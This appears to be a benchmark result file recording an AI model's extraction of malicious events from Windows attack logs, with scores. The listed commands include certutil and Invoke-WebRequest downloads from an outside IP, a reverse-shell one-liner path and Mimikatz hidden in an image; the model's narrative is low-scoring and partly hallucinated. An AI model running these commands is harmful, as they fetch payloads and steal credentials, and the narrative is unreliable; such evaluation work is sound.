@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powersell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/Invoke-PowerShellTcpOneLine -method post -UseBasicParsing\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\_MEI73082\\readme.txt\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' '\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method ''POST'' -UseBasicParsing -ContentType ``application/json'''",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "CertUtil.exe -URLCACHE -SPLIT -F HTTP://124.223.85.207:8082/T1218.005.HTA",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The analyzed system has been compromised through multiple vectors. The attacker initiated an initial access vector via PowerShell script injection in various forms such as Powershell.exe executing scripts like 47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1, invocation of atomic tests using Invoke-AtomicTest, copying files, decoding URLs, and executing downloaded executables. Additionally, commands were executed within PowerShell sessions, utilizing techniques like Invoke-Webrequest. Malware was also deployed using methods like CertUtil.exe -Urlcache -Split, powering web requests to remote servers for data gathering, persistence through registry manipulation, lateral movement via SMB shares, and credential access via Mimikatz.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 238946,
+      "completion_tokens": 4962,
+      "total_tokens": 243908,
+      "wall_clock_s": 65.895,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0625,
+      "recall": 0.045454545454545456,
+      "f1": 0.052631578947368425,
+      "tp": 1,
+      "fp": 15,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.0625,
+      "recall": 0.043478260869565216,
+      "f1": 0.05128205128205128,
+      "tp": 1,
+      "fp": 15,
+      "fn": 22,
+      "recall_partial": 0.06521739130434782
+    },
+    "hallucination_rate": 0.2631578947368421,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 238946,
+      "completion_tokens": 4962,
+      "total_tokens": 243908,
+      "wall_clock_s": 65.895,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
